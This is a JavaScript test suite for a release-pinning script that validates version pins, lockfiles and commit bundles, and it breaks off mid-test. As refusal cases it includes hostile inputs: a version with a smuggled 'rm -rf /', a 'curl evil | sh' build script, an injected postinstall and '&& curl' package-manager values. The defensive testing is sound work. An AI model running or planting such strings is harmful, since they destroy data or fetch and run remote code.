// Tests for scripts/release-pin.mjs (EP-1747 phase 5): input validation, where
// each manifest takes its pin, ranges (kept across a prerelease pin), never moving
// back, the lockfile check, and what the commit may contain.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import {
  addCommand,
  apply,
  backwardsRefusal,
  commitMessage,
  dependencyField,
  lockedVersion,
  ownerOf,
  parsePins,
  pinnedSpec,
  planPin,
  releaseFromBranch,
  workspacePackages,
} from '../scripts/release-pin.mjs';

test('only a Release branch is accepted', () => {
  assert.deepEqual(releaseFromBranch('release/RL-7'), { release: 'RL-7', n: 7 });
  for (const branch of ['main', 'staging', 'release/0.2.0', 'release/RL-07', 'release/RL-7-x', 'refs/heads/release/RL-7', 'release/RL-', '']) {
    assert.throws(() => releaseFromBranch(branch), /refusing branch/, branch);
  }
});

test('pins are exact revt-eng versions, prereleases only from the same Release', () => {
  assert.deepEqual(parsePins('@revt-eng/schema@0.1.562-rl.7.40  @revturbine/sdk@0.17.1', 7), [
    { name: '@revt-eng/schema', version: '0.1.562-rl.7.40' },
    { name: '@revturbine/sdk', version: '0.17.1' },
  ]);
  const refused = {
    'left-pad@1.3.0': /not a revt-eng package/,
    '@revturbine/other@1.0.0': /not a revt-eng package/,
    '@revt-eng/schema@^0.1.562': /exact/,
    '@revt-eng/schema@latest': /exact/,
    '@revt-eng/schema@rl-7': /exact/,
    '@revt-eng/schema@0.1': /exact/,
    '@revt-eng/schema@0.1.562+build.1': /exact/,
    '@revt-eng/schema': /not a revt-eng package/,
    '@revt-eng/schema@0.1.562-rl.6.40': /one of RL-7's/,
    '@revt-eng/schema@0.1.562-beta.1': /one of RL-7's/,
    '@revt-eng/schema@0.1.562;rm -rf /': /exact/,
    '@revt-eng/a@1.0.0 @revt-eng/a@1.0.1': /given twice/,
    '': /no package given/,
  };
  for (const [text, error] of Object.entries(refused)) assert.throws(() => parsePins(text, 7), error, text);
});

test('the commit message names every pin and the Release', () => {
  assert.equal(commitMessage([{ name: '@revt-eng/sdk', version: '0.17.1-rl.7.3' }], 'RL-7'), 'Pin @revt-eng/sdk@0.17.1-rl.7.3 for RL-7');
  assert.equal(commitMessage([{ name: 'a', version: '1.0.0' }, { name: 'b', version: '2.0.0' }], 'RL-7'), 'Pin a@1.0.0, b@2.0.0 for RL-7');
});

test('a pin keeps the dependency field and skips peer-only and protocol specifiers', () => {
  assert.equal(dependencyField({ devDependencies: { '@revturbine/cli': '0.19.1' } }, '@revturbine/cli'), 'devDependencies');
  assert.equal(dependencyField({ dependencies: { '@revt-eng/schema': 'workspace:*' } }, '@revt-eng/schema'), null);
  assert.equal(dependencyField({ peerDependencies: { '@revt-eng/schema': '0.1.0' } }, '@revt-eng/schema'), null);
  assert.equal(dependencyField({}, '@revt-eng/schema'), null);
});

test('pnpm workspace package lists parse in block and inline form', () => {
  assert.deepEqual(workspacePackages("packages:\n  - web-sdk\n  - 'server-node'\nshamefullyHoist: true\n"), ['web-sdk', 'server-node']);
  assert.deepEqual(workspacePackages('packages: []\n'), []);
  assert.deepEqual(workspacePackages("packages: ['apps/*']\n"), ['apps/*']);
  assert.deepEqual(workspacePackages('useNodeVersion: 24.21.0\n'), []);
});

function repo(files) {
  const root = mkdtempSync(path.join(os.tmpdir(), 'release-pin-'));
  for (const [file, content] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
    writeFileSync(path.join(root, file), typeof content === 'string' ? content : `${JSON.stringify(content, null, 2)}\n`);
  }
  const git = (...args) => execFileSync('git', args, { cwd: root, stdio: 'pipe' });
  git('init', '-q');
  git('-c', 'core.autocrlf=false', 'add', '-A');
  git('-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'init');
  return root;
}

test('each manifest directory takes the pin through the lockfile that covers it', () => {
  const root = repo({
    'package.json': { name: 'root' },
    'pnpm-lock.yaml': '',
    'pnpm-workspace.yaml': 'packages:\n  - web-sdk\n',
    'web-sdk/package.json': { name: 'web-sdk' },
    'pages-build/package.json': { name: 'pages' },
    'pages-build/pnpm-lock.yaml': '',
    'pages-build/pnpm-workspace.yaml': 'packages: []\n',
    'examples/app/package.json': { name: 'app' },
    'examples/app/package-lock.json': '{}',
    'loose/package.json': { name: 'loose' },
  });
  assert.deepEqual(ownerOf(root, '.'), { pm: 'pnpm', workspaceRoot: true, lock: 'pnpm-lock.yaml', importer: '.' });
  assert.deepEqual(ownerOf(root, 'web-sdk'), { pm: 'pnpm', workspaceRoot: false, lock: 'pnpm-lock.yaml', importer: 'web-sdk' });
  assert.deepEqual(ownerOf(root, 'pages-build'), { pm: 'pnpm', workspaceRoot: true, lock: 'pages-build/pnpm-lock.yaml', importer: '.' });
  assert.deepEqual(ownerOf(root, 'examples/app'), { pm: 'npm', lock: 'examples/app/package-lock.json', importer: '.' });
  assert.deepEqual(ownerOf(root, 'loose'), { pm: null });
  assert.deepEqual(addCommand({ pm: 'pnpm', workspaceRoot: true }, 'dependencies', ['a@1.0.0']), ['pnpm', ['add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', '--workspace-root', 'a@1.0.0']]);
  assert.deepEqual(addCommand({ pm: 'npm' }, 'devDependencies', ['a@1.0.0']), ['npm', ['install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', 'a@1.0.0']]);
});

// A fake package manager: an exact add rewrites the spec in package.json, and every
// command rewrites the lockfile from what it has resolved (resolveTo overrides a
// resolution, to make a lockfile disagree with the pin).
function fakeAdd(root, calls, { extra, resolveTo } = {}) {
  const resolved = new Map();
  return (command, args, { cwd }) => {
    const dir = path.relative(root, cwd).replaceAll('\\', '/') || '.';
    calls.push([dir, command, ...args]);
    const owner = ownerOf(root, dir);
    const file = path.join(cwd, 'package.json');
    const manifest = JSON.parse(readFileSync(file, 'utf8'));
    if (!resolved.has(owner.lock)) resolved.set(owner.lock, new Map());
    const importers = resolved.get(owner.lock);
    if (!importers.has(owner.importer)) importers.set(owner.importer, new Map());
    const deps = importers.get(owner.importer);
    for (const field of ['dependencies', 'devDependencies', 'optionalDependencies']) {
      for (const [name, spec] of Object.entries(manifest[field] ?? {})) if (!deps.has(name) && /^\d/.test(spec)) deps.set(name, spec);
    }
    for (const spec of args.filter((arg) => arg.includes('@') && !arg.startsWith('-'))) {
      const at = spec.lastIndexOf('@');
      const name = spec.slice(0, at);
      for (const field of ['dependencies', 'devDependencies', 'optionalDependencies']) {
        if (manifest[field]?.[name]) manifest[field][name] = spec.slice(at + 1);
      }
      deps.set(name, resolveTo?.[name] ?? spec.slice(at + 1));
    }
    writeFileSync(file, `${JSON.stringify(manifest, null, 2)}\n`);
    const lockFile = path.join(root, owner.lock);
    if (owner.pm === 'npm') {
      writeFileSync(lockFile, `${JSON.stringify({ packages: Object.fromEntries([...deps].map(([n, v]) => [`node_modules/${n}`, { version: v }])) }, null, 2)}\n`);
    } else {
      const lines = ["lockfileVersion: '9.0'", '', 'importers:', ''];
      for (const [importer, list] of importers) {
        lines.push(`  ${importer}:`, '    dependencies:');
        for (const [n, v] of list) lines.push(`      '${n}':`, `        specifier: ${v}`, `        version: ${v}(peer@1.0.0)`);
        lines.push('');
      }
      writeFileSync(lockFile, `${lines.join('\n')}\n`);
    }
    extra?.(cwd);
    return { status: 0 };
  };
}

test('apply pins every manifest that depends on the package and reports only manifests and lockfiles', () => {
  const root = repo({
    'package.json': { name: 'root', dependencies: { '@revt-eng/schema': '0.1.561' } },
    'pnpm-lock.yaml': '',
    'pnpm-workspace.yaml': 'packages:\n  - web-sdk\n',
    'web-sdk/package.json': { name: 'web-sdk', devDependencies: { '@revt-eng/schema': '0.1.561' } },
    'loose/package.json': { name: 'loose', dependencies: { '@revt-eng/schema': '0.1.500' } },
    'tests/fixtures/x/package.json': { name: 'fixture', dependencies: { '@revt-eng/schema': '0.0.1' } },
    'README.md': 'readme\n',
  });
  const calls = [];
  const pins = parsePins('@revt-eng/schema@0.1.562-rl.7.40', 7);
  const result = apply({ root, pins, release: 'RL-7', run: fakeAdd(root, calls) });
  assert.deepEqual(calls, [
    ['.', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', '--workspace-root', '@revt-eng/schema@0.1.562-rl.7.40'],
    ['web-sdk', 'pnpm', 'add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-dev', '@revt-eng/schema@0.1.562-rl.7.40'],
  ]);
  assert.equal(JSON.parse(readFileSync(path.join(root, 'loose/package.json'), 'utf8')).dependencies['@revt-eng/schema'], '0.1.562-rl.7.40');
  assert.equal(JSON.parse(readFileSync(path.join(root, 'tests/fixtures/x/package.json'), 'utf8')).dependencies['@revt-eng/schema'], '0.0.1');
  assert.deepEqual(result.files, ['loose/package.json', 'package.json', 'pnpm-lock.yaml', 'web-sdk/package.json']);
  assert.equal(result.message, 'Pin @revt-eng/schema@0.1.562-rl.7.40 for RL-7');

  const again = apply({ root, pins, release: 'RL-7', run: fakeAdd(root, []) });
  assert.equal(again.files.length, 4, 'nothing new was run; the earlier changes are still uncommitted');
});

test('apply refuses a package the repository does not depend on, and a change outside manifests and lockfiles', () => {
  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revt-eng/schema': '0.1.561' } }, 'package-lock.json': '{}', 'README.md': 'readme\n' });
  assert.throws(() => apply({ root, pins: parsePins('@revt-eng/core@0.1.562', 7), release: 'RL-7', run: fakeAdd(root, []) }), /not a dependency/);
  const touchReadme = (cwd) => writeFileSync(path.join(cwd, 'README.md'), 'changed\n');
  assert.throws(() => apply({ root, pins: parsePins('@revt-eng/schema@0.1.562', 7), release: 'RL-7', run: fakeAdd(root, [], { extra: touchReadme }) }), /outside manifests and lockfiles: README\.md/);
});

test('a manifest that already pins the version is left alone', () => {
  const root = repo({ 'package.json': { name: 'root', devDependencies: { '@revturbine/cli': '0.21.20' } }, 'package-lock.json': '{}' });
  const calls = [];
  const result = apply({ root, pins: parsePins('@revturbine/cli@0.21.20', 7), release: 'RL-7', run: fakeAdd(root, calls) });
  assert.deepEqual(calls, []);
  assert.deepEqual(result.files, []);
});

test("a prerelease pins exactly; a release keeps a range's form and upper bound and raises its lower bound", () => {
  assert.equal(pinnedSpec('>=0.12.5 <1', '0.13.0-rl.7.4'), '0.13.0-rl.7.4');
  assert.equal(pinnedSpec('0.12.5', '0.13.0'), '0.13.0', 'an exact specifier stays exact');
  assert.equal(pinnedSpec('>=0.12.5 <1', '0.13.0'), '>=0.13.0 <1');
  assert.equal(pinnedSpec('>=0.11.0  <1', '0.17.1'), '>=0.17.1  <1', 'spacing is kept');
  assert.equal(pinnedSpec('^0.12.5', '0.13.0'), '^0.13.0');
  assert.equal(pinnedSpec('~1.2.3', '1.2.9'), '~1.2.9');
  assert.equal(pinnedSpec('>1.0.0 <=2.0.0', '1.0.5'), '>=1.0.5 <=2.0.0');
  assert.equal(pinnedSpec('1.0.0 - 2.0.0', '1.5.0'), '1.5.0 - 2.0.0');
  const refused = {
    '>=0.12.5 <1': ['1.0.0', /upper bound <1 excludes it/],
    '>=0.13.0 <1': ['0.12.9', /below its lower bound 0\.13\.0/],
    '^1.0.0 || ^2.0.0': ['2.1.0', /union/],
    '*': ['1.0.0', /not a comparator/],
    '1.x': ['1.2.0', /not a comparator/],
    '<1': ['0.5.0', /no lower bound/],
    '>=1.0.0 >=1.1.0': ['1.2.0', /more than one lower bound/],
  };
  for (const [range, [version, error]] of Object.entries(refused)) assert.throws(() => pinnedSpec(range, version), error, range);
});

test('a pin never moves a manifest back to an earlier build of the same Release', () => {
  assert.match(backwardsRefusal('0.1.562-rl.7.41', '0.1.562-rl.7.40', 7, 'x'), /back from 0\.1\.562-rl\.7\.41 to 0\.1\.562-rl\.7\.40: build 41 of RL-7 is later than build 40/);
  assert.equal(backwardsRefusal('0.1.562-rl.7.39', '0.1.562-rl.7.40', 7, 'x'), null);
  assert.equal(backwardsRefusal('0.1.562-rl.6.90', '0.1.562-rl.7.1', 7, 'x'), null, 'another Release: semver, and RL-7 sorts after RL-6');
  assert.equal(backwardsRefusal('0.1.561', '0.1.562-rl.7.1', 7, 'x'), null);
  assert.equal(backwardsRefusal('0.2.0-rl.7.40', '0.1.562-rl.7.41', 7, 'x'), null, 'a reverted bump: build 41 is newer though its version is lower');
  assert.match(backwardsRefusal('0.1.562-rl.7.41', '0.2.0-rl.7.40', 7, 'x'), /build 41 of RL-7 is later than build 40/, 'within a Release the build number decides, not semver');
  assert.match(backwardsRefusal('0.1.563', '0.1.562-rl.7.1', 7, 'x'), /0\.1\.563 is later/, 'a prerelease against a release: semver');
  assert.equal(backwardsRefusal('>=0.12.5 <1', '0.1.0', 7, 'x'), null, 'a range is checked by raiseLowerBound');

  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revt-eng/schema': '0.1.562-rl.7.41' } }, 'package-lock.json': '{}' });
  const calls = [];
  assert.throws(() => apply({ root, pins: parsePins('@revt-eng/schema@0.1.562-rl.7.40', 7), release: 'RL-7', run: fakeAdd(root, calls) }), /refusing to pin @revt-eng\/schema in package\.json back from 0\.1\.562-rl\.7\.41/);
  assert.deepEqual(calls, [], 'nothing ran');
});

test('a release pinned over a range: the exact add resolves it, then the raised range is written back with a lockfile-only install', () => {
  const root = repo({
    'package.json': { name: 'root', dependencies: { '@revturbine/sdk': '>=0.12.5 <1' }, devDependencies: { '@revt-eng/core': '0.1.561' } },
    'package-lock.json': '{}',
  });
  const calls = [];
  const result = apply({ root, pins: parsePins('@revturbine/sdk@0.17.1 @revt-eng/core@0.1.562', 7), release: 'RL-7', run: fakeAdd(root, calls) });
  assert.deepEqual(calls, [
    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--git=git', '--save-prod', '@revturbine/sdk@0.17.1'],
    ['.', 'npm', 'install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', '@revt-eng/core@0.1.562'],
    ['.', 'npm', 'install', '--package-lock-only', '--ignore-scripts', '--git=git'],
  ]);
  const manifest = JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8'));
  assert.equal(manifest.dependencies['@revturbine/sdk'], '>=0.17.1 <1');
  assert.equal(manifest.devDependencies['@revt-eng/core'], '0.1.562');
  assert.deepEqual(result.files, ['package-lock.json', 'package.json']);
  assert.deepEqual(apply({ root, pins: parsePins('@revturbine/sdk@0.17.1', 7), release: 'RL-7', run: fakeAdd(root, []) }).files.length, 2, 'already pinned: nothing more runs');
});

test('a range replaced by a prerelease pin is recorded, and the final pin restores it with the new lower bound', () => {
  assert.deepEqual(planPin('>=0.12.5 <1', '0.13.0-rl.7.4', undefined), { spec: '0.13.0-rl.7.4', record: '>=0.12.5 <1' });
  assert.deepEqual(planPin('0.13.0-rl.7.4', '0.13.0-rl.7.9', '>=0.12.5 <1'), { spec: '0.13.0-rl.7.9', record: '>=0.12.5 <1' });
  assert.deepEqual(planPin('0.13.0-rl.7.9', '0.13.0', '>=0.12.5 <1'), { spec: '>=0.13.0 <1', record: undefined });
  assert.deepEqual(planPin('0.1.561', '0.1.562-rl.7.4', undefined), { spec: '0.1.562-rl.7.4', record: undefined }, 'an exact specifier records nothing');
  assert.deepEqual(planPin('0.1.562-rl.7.4', '0.1.562', undefined), { spec: '0.1.562', record: undefined });

  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revturbine/sdk': '>=0.12.5 <1' } }, 'package-lock.json': '{}' });
  const git = (...args) => execFileSync('git', args, { cwd: root, stdio: 'pipe' });
  const commit = (files) => {
    git('-c', 'core.autocrlf=false', 'add', '-A', '--', ...files);
    git('-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'pin');
  };
  const run = fakeAdd(root, []);
  const first = apply({ root, pins: parsePins('@revturbine/sdk@0.13.0-rl.7.4', 7), release: 'RL-7', run });
  assert.deepEqual(first.files, ['.release-pins.json', 'package-lock.json', 'package.json'], 'the new record file is part of the commit');
  assert.deepEqual(JSON.parse(readFileSync(path.join(root, '.release-pins.json'), 'utf8')), { 'package.json': { '@revturbine/sdk': '>=0.12.5 <1' } });
  assert.equal(JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8')).dependencies['@revturbine/sdk'], '0.13.0-rl.7.4');
  commit(first.files);

  const second = apply({ root, pins: parsePins('@revturbine/sdk@0.13.0-rl.7.9', 7), release: 'RL-7', run });
  assert.deepEqual(second.files, ['package-lock.json', 'package.json'], 'the record is kept as it was');
  commit(second.files);

  const final = apply({ root, pins: parsePins('@revturbine/sdk@0.13.0', 7), release: 'RL-7', run });
  assert.equal(JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8')).dependencies['@revturbine/sdk'], '>=0.13.0 <1');
  assert.ok(!existsSync(path.join(root, '.release-pins.json')), 'the last record goes, and the file with it');
  assert.deepEqual(final.files, ['.release-pins.json', 'package-lock.json', 'package.json'], 'the deletion is part of the commit');
});

test('the lockfile must resolve exactly the pinned version', () => {
  assert.equal(lockedVersion({ pm: 'pnpm', importer: 'web-sdk', text: "importers:\n\n  .:\n    dependencies:\n      a:\n        specifier: 1.0.0\n        version: 1.0.0\n\n  web-sdk:\n    devDependencies:\n      '@revt-eng/schema':\n        specifier: 0.1.562-rl.7.4\n        version: 0.1.562-rl.7.4(zod@4.4.3)\n\npackages:\n" }, '@revt-eng/schema'), '0.1.562-rl.7.4');
  assert.equal(lockedVersion({ pm: 'npm', importer: '.', text: JSON.stringify({ packages: { 'node_modules/@revturbine/sdk': { version: '0.17.0' } } }) }, '@revturbine/sdk'), '0.17.0');

  const root = repo({ 'package.json': { name: 'root', dependencies: { '@revturbine/sdk': '>=0.12.5 <1' } }, 'package-lock.json': '{}' });
  assert.throws(
    () => apply({ root, pins: parsePins('@revturbine/sdk@0.17.0', 7), release: 'RL-7', run: fakeAdd(root, [], { resolveTo: { '@revturbine/sdk': '0.17.2' } }) }),
    /package-lock\.json resolves @revturbine\/sdk to 0\.17\.2 for \., not the pinned 0\.17\.0/,
  );
});

// EP-1747 phase 7: the pin job runs the package manager with no secrets and bundles the result; the push job runs
// nothing from the Release branch, checks the bundle against the branch head and commits it with git plumbing.
import {
  addCommand as safeAdd,
  commitBundle as bundleCommit,
  lockfileCommand as safeLockfile,
  manifestPinRefusal,
  packageManagerSpec,
  pinnablePath,
  recordsRefusal,
  workspacePinRefusal,
  writeBundle,
} from '../scripts/release-pin.mjs';

test('only a released npm, pnpm or yarn is installed as the packageManager', () => {
  assert.equal(packageManagerSpec('pnpm@10.33.0'), 'pnpm@10.33.0');
  assert.equal(packageManagerSpec('npm@11.18.0'), 'npm@11.18.0');
  assert.equal(packageManagerSpec('pnpm@11.13.1+sha512.Zm9vYmFy0123'), 'pnpm@11.13.1');
  assert.equal(packageManagerSpec(undefined), null);
  for (const bad of ['pnpm@latest', 'pnpm@^10.0.0', 'evil@1.0.0', 'pnpm@10.0.0 && curl x', 'pnpm@https://x/y.tgz', 'pnpm@10.0.0-rc.1', 'pnpm@10.0.0+sha512.a b', 7]) {
    assert.throws(() => packageManagerSpec(bad), /refusing packageManager/, String(bad));
  }
});

test('the package manager runs with no scripts, no pnpmfile and the runner git', () => {
  assert.deepEqual(safeAdd({ pm: 'pnpm', workspaceRoot: false }, 'dependencies', ['a@1.0.0']),
    ['pnpm', ['add', '--save-exact', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git', '--save-prod', 'a@1.0.0']]);
  assert.deepEqual(safeAdd({ pm: 'npm' }, 'devDependencies', ['a@1.0.0']), ['npm', ['install', '--save-exact', '--ignore-scripts', '--git=git', '--save-dev', 'a@1.0.0']]);
  assert.deepEqual(safeLockfile({ pm: 'pnpm' }), ['pnpm', ['install', '--lockfile-only', '--no-frozen-lockfile', '--ignore-scripts', '--ignore-pnpmfile', '--config.git=git']]);
  assert.deepEqual(safeLockfile({ pm: 'npm' }), ['npm', ['install', '--package-lock-only', '--ignore-scripts', '--git=git']]);
});

test('only manifests, lockfiles, pnpm-workspace.yaml and .release-pins.json are pinnable paths', () => {
  for (const ok of ['package.json', 'web-sdk/package.json', 'pnpm-lock.yaml', 'a/package-lock.json', 'npm-shrinkwrap.json', 'pnpm-workspace.yaml', '.release-pins.json']) assert.equal(pinnablePath(ok), true, ok);
  for (const bad of ['.github/workflows/x.yml', 'scripts/package.json.mjs', '../package.json', '/package.json', 'a/../package.json', 'node_modules/x/package.json', '.git/package.json', 'a\\package.json', 'a//package.json', 'x/.release-pins.json', '', null]) {
    assert.equal(pinnablePath(bad), false, String(bad));
  }
});

test('a manifest may change only in the pinned dependencies, to what apply writes', () => {
  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
  const before = JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '^1.3.0', other: '1.0.0' } });
  const pinned = (over) => JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3', other: '1.0.0' }, ...over });
  assert.equal(manifestPinRefusal('package.json', before, pinned(), pins, 7, {}), null);
  assert.match(manifestPinRefusal('package.json', before, pinned({ scripts: { build: 'curl evil | sh' } }), pins, 7, {}), /more than the pinned dependencies/);
  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3', other: '9.9.9' } }), pins, 7, {}), /more than/);
  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.2', other: '1.0.0' } }), pins, 7, {}), /not the pin's 1\.4\.0-rl\.7\.3/);
  assert.match(manifestPinRefusal('package.json', before, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { other: '1.0.0' }, devDependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' } }), pins, 7, {}), /more than/, 'a pin keeps the field');
  assert.match(manifestPinRefusal('package.json', before, before, pins, 7, {}), /pins nothing/);
  // A final pin restores the range recorded when the prerelease was pinned.
  const final = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
  const records = { 'package.json': { '@revt-eng/sdk': '^1.3.0' } };
  const atPrerelease = pinned();
  assert.equal(manifestPinRefusal('package.json', atPrerelease, JSON.stringify({ name: 'x', scripts: { build: 'tsc' }, dependencies: { '@revt-eng/sdk': '^1.4.0', other: '1.0.0' } }), final, 7, records), null);
  assert.match(manifestPinRefusal('package.json', atPrerelease, pinned({ dependencies: { '@revt-eng/sdk': '1.4.0', other: '1.0.0' } }), final, 7, records), /not the pin's \^1\.4\.0/);
});

test('pnpm-workspace.yaml and .release-pins.json change only for the pinned packages', () => {
  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
  assert.equal(workspacePinRefusal('pnpm-workspace.yaml', 'packages:\n  - a\n', 'packages:\n  - a\nminimumReleaseAgeExclude:\n  - \'@revt-eng/sdk@1.4.0\'\n', pins), null);
  assert.match(workspacePinRefusal('pnpm-workspace.yaml', 'packages:\n  - a\n', 'packages:\n  - a\nonlyBuiltDependencies:\n  - evil\n', pins), /names no pinned package/);
  assert.equal(recordsRefusal({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } }, null, pins), null);
  assert.equal(recordsRefusal({}, JSON.stringify({ 'web-sdk/package.json': { '@revt-eng/sdk': '^1.3.0' } }), [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }], (file, name) => (file === 'web-sdk/package.json' && name === '@revt-eng/sdk' ? '^1.3.0' : undefined)), null);
  assert.match(recordsRefusal({}, JSON.stringify({ 'package.json': { other: '^1' } }), pins), /not being pinned/);
  assert.match(recordsRefusal({}, JSON.stringify({ '.github/x.yml': {} }), pins), /not a manifest/);
});

test('the push job commits a checked bundle on the head it was pinned on, and nothing else', () => {
  const work = mkdtempSync(path.join(os.tmpdir(), 'release-pin-bundle-'));
  const src = path.join(work, 'src');
  const run = (cwd, args, input, env = {}) => execFileSync('git', args, { cwd, input, encoding: 'utf8', env: { ...process.env, ...env } });
  mkdirSync(src);
  run(src, ['init', '-q', '-b', 'release/RL-7']);
  const manifest = { name: 'x', dependencies: { '@revt-eng/sdk': '^1.3.0' } };
  writeFileSync(path.join(src, 'package.json'), `${JSON.stringify(manifest, null, 2)}\n`);
  writeFileSync(path.join(src, 'package-lock.json'), `${npmLock('1.3.0', ghTarball('@revt-eng/sdk', '1.3.0'), 'sha512-old')}\n`);
  writeFileSync(path.join(src, 'build.sh'), 'echo hi\n');
  const id = { GIT_AUTHOR_NAME: 'pin', GIT_AUTHOR_EMAIL: 'pin@example.com', GIT_COMMITTER_NAME: 'pin', GIT_COMMITTER_EMAIL: 'pin@example.com' };
  run(src, ['add', '.']);
  run(src, ['commit', '-q', '-m', 'base'], undefined, id);
  const tip = run(src, ['rev-parse', 'HEAD']).trim();
  const bare = path.join(work, 'bare.git');
  run(work, ['clone', '-q', '--bare', src, bare]);
  const git = (args, input, env = {}) => run(work, ['--git-dir', bare, ...args], input, { ...id, ...env });

  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
  writeFileSync(path.join(src, 'package.json'), `${JSON.stringify({ ...manifest, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' } }, null, 2)}\n`);
  writeFileSync(path.join(src, 'package-lock.json'), `${npmLock('1.4.0-rl.7.3', ghTarball('@revt-eng/sdk', '1.4.0-rl.7.3'), 'sha512-new')}\n`);
  writeFileSync(path.join(src, '.release-pins.json'), `${JSON.stringify({ 'package.json': { '@revt-eng/sdk': '^1.3.0' } })}\n`);
  const bundle = path.join(work, 'bundle');
  writeBundle(src, { release: 'RL-7', pins, files: ['.release-pins.json', 'package-lock.json', 'package.json'] }, bundle, tip);

  const registry = new Map([['@revt-eng/sdk', { '1.4.0-rl.7.3': { integrity: 'sha512-new', tarball: ghTarball('@revt-eng/sdk', '1.4.0-rl.7.3') } }]]);
  const done = bundleCommit({ bundle, tip, pins, release: 'RL-7', n: 7, git, registry });
  assert.deepEqual(done.files, ['.release-pins.json', 'package-lock.json', 'package.json']);
  assert.equal(git(['log', '-1', '--format=%P %s', done.sha]).trim(), `${tip} Pin @revt-eng/sdk@1.4.0-rl.7.3 for RL-7`);
  assert.equal(git(['diff', '--name-only', tip, done.sha]).trim().split('\n').sort().join(' '), '.release-pins.json package-lock.json package.json');
  assert.equal(git(['cat-file', 'blob', `${done.sha}:build.sh`]), 'echo hi\n', 'files outside the bundle are the head\'s');

  assert.deepEqual(bundleCommit({ bundle, tip: 'f'.repeat(40), pins, release: 'RL-7', n: 7, git }).moved, true, 'a moved head is reported, not committed');
  assert.throws(() => bundleCommit({ bundle, tip, pins: [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.4' }], release: 'RL-7', n: 7, git }), /other packages/);

  const tampered = (mutate) => {
    const dir = mkdtempSync(path.join(work, 'tampered-'));
    writeBundle(src, { release: 'RL-7', pins, files: ['package.json'] }, dir, tip);
    mutate(dir);
    return () => bundleCommit({ bundle: dir, tip, pins, release: 'RL-7', n: 7, git, registry });
  };
  const manifestOf = (dir) => JSON.parse(readFileSync(path.join(dir, 'manifest.json'), 'utf8'));
  const rewrite = (dir, value) => writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(value));
  assert.throws(tampered((dir) => rewrite(dir, { ...manifestOf(dir), files: [{ path: 'build.sh', deleted: false }] })), /refusing "build\.sh"/);
  assert.throws(tampered((dir) => rewrite(dir, { ...manifestOf(dir), files: [{ path: 'package.json', deleted: true }] })), /deletes only/);
  assert.throws(tampered((dir) => writeFileSync(path.join(dir, 'files', 'package.json'), JSON.stringify({ ...manifest, dependencies: { '@revt-eng/sdk': '1.4.0-rl.7.3' }, scripts: { postinstall: 'x' } }))), /more than the pinned/);
  assert.throws(tampered((dir) => { mkdirSync(path.join(dir, 'files', 'b'), { recursive: true }); writeFileSync(path.join(dir, 'files', 'b', 'package-lock.json'), '{}'); rewrite(dir, { ...manifestOf(dir), files: [...manifestOf(dir).files, { path: 'b/package-lock.json', deleted: false }] }); }), /adds b\/package-lock\.json/);
});

// Re-review: the push job checks lockfile changes too, entry by entry.
import { npmLockRefusal, pnpmLockRefusal, readRegistry, RegistryUnavailable, resolutionRefusal } from '../scripts/release-pin.mjs';

function ghTarball(name, version, hash = 'abc123') { return `https://npm.pkg.github.com/download/${name}/${version}/${hash}`; }
function npmLock(version, resolved, integrity, extra = {}) { return JSON.stringify({
  name: 'x', lockfileVersion: 3, requires: true,
  packages: {
    '': { name: 'x', dependencies: { '@revt-eng/sdk': version === '1.3.0' ? '^1.3.0' : version, zod: '4.0.0' } },
    'node_modules/@revt-eng/sdk': { version, resolved, integrity, license: 'MIT', dependencies: { zod: '4.0.0' }, ...extra },
    'node_modules/zod': { version: '4.0.0', resolved: 'https://registry.npmjs.org/zod/-/zod-4.0.0.tgz', integrity: 'sha512-zod' },
  },
}); }

test('a package-lock.json may re-pin only the pinned entries, at the pin, from the registry', () => {
  const pins = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }];
  const before = npmLock('1.3.0', ghTarball('@revt-eng/sdk', '1.3.0'), 'sha512-old');
  const good = npmLock('1.4.0-rl.7.3', ghTarball('@revt-eng/sdk', '1.4.0-rl.7.3', 'def456'), 'sha512-new');
  const registry = new Map([['@revt-eng/sdk', { '1.4.0-rl.7.3': { integrity: 'sha512-new', tarball: ghTarball('@revt-eng/sdk', '1.4.0-rl.7.3', 'def456') } }]]);
